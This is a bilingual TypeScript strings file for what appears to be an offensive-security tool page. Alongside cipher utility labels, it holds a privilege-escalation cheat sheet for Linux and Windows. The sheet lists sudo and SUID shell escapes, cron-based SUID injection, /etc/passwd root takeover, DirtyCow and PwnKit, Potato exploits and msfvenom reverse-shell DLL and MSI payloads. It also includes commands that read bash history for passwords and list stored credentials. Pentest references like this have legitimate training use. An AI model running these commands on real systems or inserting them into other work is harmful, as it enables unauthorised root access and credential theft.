// Localized strings for src/tools/offsec.tsx
// zh / en branches must keep identical keys and order.
// The privesc command table lives here too; `cmd` is identical across
// branches (commands must not be translated), only `label` / `note` vary.

type PrivItem = { label: string; cmd: string; note?: string }
type PrivGroup = { name: string; items: PrivItem[] }

export const offsecL = {
  zh: {
    xor: {
      nonPrintable: '(非可打印输出，请看 Hex)',
      input: '输入数据',
      key: 'XOR 密钥',
      inputHex: '输入是 Hex',
      keyHex: '密钥是 Hex',
      textResult: '文本结果',
      hexResult: 'Hex 结果',
      note: '* XOR 是可逆运算：同一密钥再异或一次即还原。循环使用密钥（Vernam 变体）。',
    },
    rot: {
      input: '输入',
      shift: '位移量 (1-25)',
      placeholder: '占位',
      brute: '爆破全部 25 种位移',
      caesar: (shift: string) => `凯撒位移 ${shift}（ROT13 即位移 13，自逆）`,
      rot47: 'ROT47（覆盖全部可打印 ASCII，自逆）',
    },
    vigenere: {
      input: '文本（仅处理 a-z，忽略其他字符）',
      key: '密钥（字母）',
      enc: '加密',
      dec: '解密',
      cipher: '密文',
      plain: '明文',
      note: '* 经典多表替换密码（1553年），曾被称为“不可破译的密码”，1863 年被 Kasiski 检验攻破。',
    },
    privesc: {
      filter: '筛选',
      noMatch: '没有匹配的条目',
      groups: [
        {
          name: 'Linux · 信息收集',
          items: [
            { label: '一键枚举', cmd: `linpeas.sh | tee /tmp/lp.txt`, note: 'LinPEAS 全面枚举' },
            { label: '内核与发行版', cmd: `uname -a && cat /etc/os-release` },
            { label: 'sudo 权限', cmd: `sudo -l`, note: '重点找 NOPASSWD 与通配符' },
            { label: 'SUID 文件', cmd: `find / -perm -4000 -type f 2>/dev/null` },
            { label: 'SGID 文件', cmd: `find / -perm -2000 -type f 2>/dev/null` },
            { label: '可写关键文件', cmd: `find /etc -writable -type f 2>/dev/null` },
            { label: '计划任务', cmd: `cat /etc/crontab; ls -la /etc/cron.d/` },
            { label: 'capabilities', cmd: `getcap -r / 2>/dev/null`, note: 'cap_setuid 类等同 root' },
            { label: '历史命令中的密码', cmd: `cat ~/.bash_history | grep -iE "pass|mysql|ssh"` },
          ],
        },
        {
          name: 'Linux · 常见利用',
          items: [
            { label: 'sudo find 提权', cmd: `sudo find . -exec /bin/sh \\; -quit`, note: 'find 在 sudo -l 中' },
            { label: 'sudo vim 提权', cmd: `sudo vim -c ':!/bin/sh'` },
            { label: 'sudo awk 提权', cmd: `sudo awk 'BEGIN {system("/bin/sh")}'` },
            { label: 'sudo nmap 提权', cmd: `echo "os.execute('/bin/sh')" > /tmp/x.nse && sudo nmap --script=/tmp/x.nse` },
            { label: 'SUID bash', cmd: `./bash -p`, note: '-p 保留 euid' },
            { label: 'SUID python', cmd: `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'` },
            { label: '可写 /etc/passwd', cmd: `openssl passwd -1 'hacked'  # 生成哈希后写入 root 行`, note: '或新增 uid=0 用户' },
            { label: 'cron 通配符注入', cmd: `echo 'chmod u+s /bin/bash' > /tmp/run.sh`, note: 'root 定时任务执行可写脚本' },
            { label: 'NFS no_root_squash', cmd: `showmount -e <ip>  # 挂载后放 SUID 二进制`, note: '挂载后放 SUID 二进制' },
            { label: 'DirtyCow (CVE-2016-5195)', cmd: `./dirty /usr/bin/passwd`, note: '内核 2.6.22 ~ 4.8.3' },
            { label: 'PwnKit (CVE-2021-4034)', cmd: `./PwnKit`, note: 'polkit pkexec，影响面极广' },
          ],
        },
        {
          name: 'Windows · 信息收集',
          items: [
            { label: '一键枚举', cmd: `winPEASx64.exe`, note: 'WinPEAS' },
            { label: '系统信息', cmd: `systeminfo | findstr /B /C:"OS"`, note: '找缺失补丁' },
            { label: '当前权限', cmd: `whoami /all`, note: '关注 SeImpersonate 等特权' },
            { label: '未加引号服务路径', cmd: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"`, note: 'Unquoted Service Path' },
            { label: '可修改的服务', cmd: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` },
            { label: '注册表自动运行', cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` },
            { label: '存储的凭据', cmd: `cmdkey /list` },
            { label: 'AlwaysInstallElevated', cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: '值为 1 则 msi 以 SYSTEM 安装' },
          ],
        },
        {
          name: 'Windows · 常见利用',
          items: [
            { label: 'PrintSpoofer', cmd: `PrintSpoofer64.exe -i -c cmd`, note: '需 SeImpersonate（服务账户常见）' },
            { label: 'JuicyPotato', cmd: `JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *`, note: 'Win 2016/10 之前' },
            { label: 'GodPotato', cmd: `GodPotato.exe -cmd "cmd /c whoami"`, note: 'Win 2012-2022 通用' },
            { label: 'RoguePotato', cmd: `RoguePotato.exe -r <攻击机IP> -e rev.exe -l 9999`, note: 'PrintSpooler 被禁用时' },
            { label: '服务路径注入', cmd: `icacls "C:\\Program Files\\Svc Dir\\"  # 在空格处放 Program.exe`, note: '配合未加引号服务路径' },
            { label: 'DLL 劫持', cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f dll > hijack.dll` },
            { label: 'msi 提权', cmd: `msfvenom -p windows/x64/shell_reverse_tcp -f msi > evil.msi && msiexec /quiet /qn /i evil.msi`, note: 'AlwaysInstallElevated' },
          ],
        },
      ] as PrivGroup[],
    },
  },
  en: {
    xor: {
      nonPrintable: '(non-printable output, see Hex)',
      input: 'Input Data',
      key: 'XOR Key',
      inputHex: 'Input is Hex',
      keyHex: 'Key is Hex',
      textResult: 'Text Result',
      hexResult: 'Hex Result',
      note: '* XOR is reversible: XORing again with the same key restores the data. Key is reused cyclically (Vernam variant).',
    },
    rot: {
      input: 'Input',
      shift: 'Shift (1-25)',
      placeholder: 'Placeholder',
      brute: 'Brute-force all 25 shifts',
      caesar: (shift: string) => `Caesar shift ${shift} (ROT13 = shift 13, self-inverse)`,
      rot47: 'ROT47 (covers all printable ASCII, self-inverse)',
    },
    vigenere: {
      input: 'Text (only a-z processed, others ignored)',
      key: 'Key (letters)',
      enc: 'Encrypt',
      dec: 'Decrypt',
      cipher: 'Ciphertext',
      plain: 'Plaintext',
      note: '* Classic polyalphabetic cipher (1553), once called "the unbreakable cipher", broken by Kasiski examination in 1863.',
    },
    privesc: {
      filter: 'Filter',
      noMatch: 'No matching entries',
      groups: [
        {
          name: 'Linux · Recon',
          items: [
            { label: 'One-click enum', cmd: `linpeas.sh | tee /tmp/lp.txt`, note: 'LinPEAS full enumeration' },
            { label: 'Kernel & distro', cmd: `uname -a && cat /etc/os-release` },
            { label: 'sudo perms', cmd: `sudo -l`, note: 'Look for NOPASSWD and wildcards' },
            { label: 'SUID files', cmd: `find / -perm -4000 -type f 2>/dev/null` },
            { label: 'SGID files', cmd: `find / -perm -2000 -type f 2>/dev/null` },
            { label: 'Writable critical files', cmd: `find /etc -writable -type f 2>/dev/null` },
            { label: 'Scheduled tasks', cmd: `cat /etc/crontab; ls -la /etc/cron.d/` },
            { label: 'capabilities', cmd: `getcap -r / 2>/dev/null`, note: 'cap_setuid ~= root' },
            { label: 'Passwords in history', cmd: `cat ~/.bash_history | grep -iE "pass|mysql|ssh"` },
          ],
        },
        {
          name: 'Linux · Exploits',
          items: [
            { label: 'sudo find privesc', cmd: `sudo find . -exec /bin/sh \\; -quit`, note: 'find listed in sudo -l' },
            { label: 'sudo vim privesc', cmd: `sudo vim -c ':!/bin/sh'` },
            { label: 'sudo awk privesc', cmd: `sudo awk 'BEGIN {system("/bin/sh")}'` },
            { label: 'sudo nmap privesc', cmd: `echo "os.execute('/bin/sh')" > /tmp/x.nse && sudo nmap --script=/tmp/x.nse` },
            { label: 'SUID bash', cmd: `./bash -p`, note: '-p keeps euid' },
            { label: 'SUID python', cmd: `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'` },
            { label: 'Writable /etc/passwd', cmd: `openssl passwd -1 'hacked'  # write hash into root line`, note: 'or add a uid=0 user' },
            { label: 'cron wildcard injection', cmd: `echo 'chmod u+s /bin/bash' > /tmp/run.sh`, note: 'root cron runs the writable script' },
            { label: 'NFS no_root_squash', cmd: `showmount -e <ip>  # drop SUID binary after mount`, note: 'drop SUID binary after mount' },
            { label: 'DirtyCow (CVE-2016-5195)', cmd: `./dirty /usr/bin/passwd`, note: 'kernel 2.6.22 ~ 4.8.3' },
            { label: 'PwnKit (CVE-2021-4034)', cmd: `./PwnKit`, note: 'polkit pkexec, very broad impact' },
          ],
        },
        {
          name: 'Windows · Recon',
          items: [
            { label: 'One-click enum', cmd: `winPEASx64.exe`, note: 'WinPEAS' },
            { label: 'System info', cmd: `systeminfo | findstr /B /C:"OS"`, note: 'find missing patches' },
            { label: 'Current privileges', cmd: `whoami /all`, note: 'watch SeImpersonate etc.' },
            { label: 'Unquoted service path', cmd: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"`, note: 'Unquoted Service Path' },
            { label: 'Modifiable services', cmd: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` },
            { label: 'Registry autorun', cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` },
            { label: 'Stored credentials', cmd: `cmdkey /list` },
            { label: 'AlwaysInstallElevated', cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: 'if 1, msi installs as SYSTEM' },
          ],
        },
        {
          name: 'Windows · Exploits',
          items: [
            { label: 'PrintSpoofer', cmd: `PrintSpoofer64.exe -i -c cmd`, note: 'needs SeImpersonate (common for service accounts)' },
            { label: 'JuicyPotato', cmd: `JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *`, note: 'before Win 2016/10' },
            { label: 'GodPotato', cmd: `GodPotato.exe -cmd "cmd /c whoami"`, note: 'Win 2012-2022' },
            { label: 'RoguePotato', cmd: `RoguePotato.exe -r <attack-ip> -e rev.exe -l 9999`, note: 'when PrintSpooler is disabled' },
            { label: 'Service path injection', cmd: `icacls "C:\\Program Files\\Svc Dir\\"  # place Program.exe at the space`, note: 'with unquoted service path' },
            { label: 'DLL hijacking', cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f dll > hijack.dll` },
            { label: 'msi privesc', cmd: `msfvenom -p windows/x64/shell_reverse_tcp -f msi > evil.msi && msiexec /quiet /qn /i evil.msi`, note: 'AlwaysInstallElevated' },
          ],
        },
      ] as PrivGroup[],
    },
  },
}
